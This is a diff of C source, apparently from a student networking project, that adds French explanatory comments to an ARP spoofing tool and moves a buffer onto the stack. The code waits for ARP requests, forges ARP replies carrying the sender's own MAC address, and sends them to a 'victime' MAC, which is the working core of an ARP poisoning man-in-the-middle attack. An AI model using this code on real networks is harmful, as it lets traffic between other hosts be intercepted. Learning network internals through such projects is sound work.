@@ -2,18 +2,19 @@
 
 int receive_arp(int sockfd, uint8_t *buffer, t_addrs *addrs)
 {
-	struct arp_packet *arp;
+	struct arp_packet 	*arp;
 
-	arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE);
+	arp = (struct arp_packet *)(buffer + ETH_HEADER_SIZE); // arp = uint d arp taille 42 +  14 pour header eth pour garder offset, l eth sera avant.
 	while (1)
 	{
-		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0)
+		if (recvfrom(sockfd, buffer, ARP_FRAME_SIZE, 0, NULL, NULL) < 0) // ecrit resultat dans buffer si recoit arp
 		{
 			if (g_sockfd != -1)
 				printf("recvfrom: %s\n", strerror(errno));
 			return (0);
 		}
-		if (ntohs(arp->opcode) != 1)
+		// verif qu on a  recu la bonne requete arp attendu. 
+		if (ntohs(arp->opcode) != 1) // big endian to little endian => request == 1 
 			continue;
 		if (ft_memcmp(arp->dst_ip, addrs->source_ip, 4) != 0)
 			continue;
@@ -27,20 +28,20 @@ int receive_arp(int sockfd, uint8_t *buffer, t_addrs *addrs)
 
 void build_reply(uint8_t *reply, t_addrs *addrs)
 {
-	struct ethernet_header *eth;
+	struct ethernet_header *eth; // avec info de reply eth que pour la reply.
 	struct arp_packet      *arp;
 
 	ft_memset(reply, 0, ARP_FRAME_SIZE);
-	eth = (struct ethernet_header *)reply;
-	ft_memcpy(eth->dst_mac, addrs->target_mac, 6);
-	ft_memcpy(eth->src_mac, addrs->source_mac, 6);
-	eth->ethertype = htons(ETH_P_ARP);
+	eth = (struct ethernet_header *)reply; // des le debut 14 octet
+	ft_memcpy(eth->dst_mac, addrs->target_mac, 6); // tu renvois a lasker mac
+	ft_memcpy(eth->src_mac, addrs->source_mac, 6); // tu donne ton addresse mac perso
+	eth->ethertype = htons(ETH_P_ARP); // eth requete pour arp (marche aussi pour wifi)
 	arp = (struct arp_packet *)(reply + ETH_HEADER_SIZE);
-	arp->hw_type    = htons(1);
-	arp->proto_type = htons(0x0800);
-	arp->hw_size    = 6;
-	arp->proto_size = 4;
-	arp->opcode     = htons(2);
+	arp->hw_type    = htons(1); // ethernet (couche reseau wifi/ethernet pour 1)
+	arp->proto_type = htons(0x0800); //  ipv4
+	arp->hw_size    = 6; // taille mac en octet
+	arp->proto_size = 4; // 4 octet ipv4
+	arp->opcode     = htons(2); // reply opcode
 	ft_memcpy(arp->src_mac, addrs->source_mac, 6);
 	ft_memcpy(arp->src_ip,  addrs->source_ip,  4);
 	ft_memcpy(arp->dst_mac, addrs->target_mac, 6);
@@ -52,10 +53,10 @@ int send_reply(int sockfd, uint8_t *reply, uint8_t *target_mac, int interface_id
 	struct sockaddr_ll dest;
 
 	ft_memset(&dest, 0, sizeof(dest));
-	dest.sll_ifindex = interface_idx;
-	dest.sll_family  = AF_PACKET;
-	dest.sll_halen   = 6;
-	ft_memcpy(dest.sll_addr, target_mac, 6);
+	dest.sll_ifindex = interface_idx; // pas l interface de notre socket
+	dest.sll_family  = AF_PACKET; // packet L2
+	dest.sll_halen   = 6; // mac Len
+	ft_memcpy(dest.sll_addr, target_mac, 6); // mac victime
 	if (hex)
 		hexdump(reply, ARP_FRAME_SIZE);
 	if (sendto(sockfd, reply, ARP_FRAME_SIZE, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
@@ -78,9 +79,10 @@ int send_gratuitous(t_addrs *addrs, int interface_idx, int verbose, int hex)
 	return (send_reply(g_sockfd, reply, addrs->target_mac, interface_idx, hex));
 }
 
-int run_spoof(t_addrs *addrs, int interface_idx, uint8_t *buffer, int verbose, int hex)
+int run_spoof(t_addrs *addrs, int interface_idx, int verbose, int hex)
 {
-	uint8_t reply[ARP_FRAME_SIZE];
+	uint8_t 			reply[ARP_FRAME_SIZE];
+	uint8_t 			buffer[ARP_FRAME_SIZE];
 
 	if (!receive_arp(g_sockfd, buffer, addrs))
 		return (0);
